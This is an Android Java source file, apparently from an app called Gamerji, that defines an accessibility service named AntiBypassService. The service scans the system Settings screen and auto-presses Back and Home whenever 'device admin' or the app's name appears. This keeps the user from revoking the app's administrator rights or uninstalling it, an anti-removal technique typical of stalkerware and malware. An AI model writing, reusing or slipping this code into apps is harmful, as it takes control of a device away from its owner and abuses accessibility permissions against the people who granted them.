package com.gamerji.app;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class AntiBypassService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getPackageName() == null) return;

        String packageName = event.getPackageName().toString();

        // Check if user is trying to open Settings
        if (packageName.equals("com.android.settings")) {
            AccessibilityNodeInfo nodeInfo = event.getSource();
            if (nodeInfo != null) {
                checkAndBlock(nodeInfo);
            }
        }
    }

    private void checkAndBlock(AccessibilityNodeInfo nodeInfo) {
        if (nodeInfo == null) return;

        CharSequence text = nodeInfo.getText();
        if (text != null) {
            String textStr = text.toString().toLowerCase();
            
            // Agar screen par ye words dikhe, toh turant bahar phek do
            if (textStr.contains("device admin") || 
                textStr.contains("device administrator") || 
                textStr.contains("gamerji")) {
                
                performGlobalAction(GLOBAL_ACTION_BACK); // Auto-press Back button
                performGlobalAction(GLOBAL_ACTION_HOME); // Auto-press Home button for extra safety
            }
        }

        // Loop through all elements on the screen
        for (int i = 0; i < nodeInfo.getChildCount(); i++) {
            checkAndBlock(nodeInfo.getChild(i));
        }
    }

    @Override
    public void onInterrupt() {
        // Required method, leave empty
    }
}

